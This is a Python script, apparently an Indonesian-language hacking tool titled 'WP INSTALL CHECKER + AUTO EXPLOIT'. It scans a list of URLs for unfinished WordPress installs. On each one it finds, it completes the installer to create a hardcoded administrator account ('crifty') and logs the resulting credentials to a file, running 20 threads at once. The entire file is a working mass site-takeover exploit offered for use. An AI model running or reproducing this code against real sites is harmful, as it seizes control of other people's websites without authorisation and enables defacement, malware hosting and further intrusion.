import requests as r, os, platform, string
from bs4 import BeautifulSoup as par
from random import choice
from concurrent.futures import ThreadPoolExecutor as td
clear = lambda: os.system("clear") if "linux" in platform.system().lower() else os.system("cls")
openFile = lambda file: open(file, "r").read().strip().split("\n")

def randPass(digit):
	asc = string.ascii_lowercase + string.digits + string.punctuation
	rand = "".join([choice(asc) for x in range(digit)])
	return rand

def saved():
	while True:
		fln = input("?: save in file: ")
		try:
			openFile(fln)
			ask = input("!: File ini sudah ada\n?: apakah hasilnya mau digabung dengan file ini?\n  >> ya/tidak (Y/T): ")
			if ask in list("Yy"):
				break
			elif ask in list("Tt"):
				continue
			else:
				continue
		except FileNotFoundError:
			break
	return fln

def ceks():
	fileip = input("?: File list url: ")
	while True:
		try:
			check = open(fileip, "r").read().strip().split("\n")
		except FileNotFoundError:
			print("!: File not found")
			fileip = input("?: File list url: ")
			continue
		break
	return check

def writer(name, content):
	try:
		if content in open(name, "r").read():
			pass
		else:
			open(name, "a+").write(content.strip().replace("\n","")+"\n")
	except FileNotFoundError:
		open(name, "a+").write(content.strip().replace("\n","")+"\n")

def wp_install(url, mail, nameFile):
	#-> set session cookie or data
	password = "balmond@12"
	sesi = r.Session()
	sesi.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"})

	#-> check content or response
	try:
		cek = sesi.get(url + "/wp-admin/install.php", allow_redirects=True).text
		if "admin_password" in str(cek) or "language-continue" in str(cek) or "id_ID" in str(cek):
			coy_params = {
				"weblog_title": "web+saya",
				"user_name": "crifty",
				"admin_password": password,
				"admin_password2": password,
				"admin_email": mail,
				"blog_public": "0",
				"Submit": "Instal+WordPress",
				"language": "id_ID"
			}
			posted = sesi.post(url + "/wp-admin/install.php?step=2", data=coy_params).text
			oks = url + "/wp-login.php#crifty@" + password
			if "WordPress has been installed" in str(posted) or "WordPress telah diinstal" in str(posted):
				writer(nameFile, oks)
				print("  \x1b[1;92m✓>\x1b[1;97m "+oks+"\x1b[1;00m")
			else:
				print("  \x1b[1;93m!>\x1b[1;97m "+oks+"\x1b[1;00m")
		else:
			print("  \x1b[1;91m✓> \x1b[1;97m"+url+"/wp-admin/install.php »\x1b[1;95m Sudah terinstall\x1b[1;00m")
	except:
		print("  \x1b[1;91m✓> \x1b[1;97m"+url+" »\x1b[1;91m Bukan wordpress\x1b[1;00m")

def main_menu():
	clear()
	print("\n\t [ WP INSTALL CHECKER + AUTO EXPLOIT ] \n")
	lis = ceks()
	email = input("?: your email: ")
	while email == "" or "@" not in email:
		email = input("?: your email: ")
	svd = saved()
	print("")
	with td(max_workers=20) as sub:
		for lss in lis:
			sub.submit(wp_install, lss, email, svd)
	print("\n✓: selesai..\n")


if __name__=="__main__":
	main_menu()
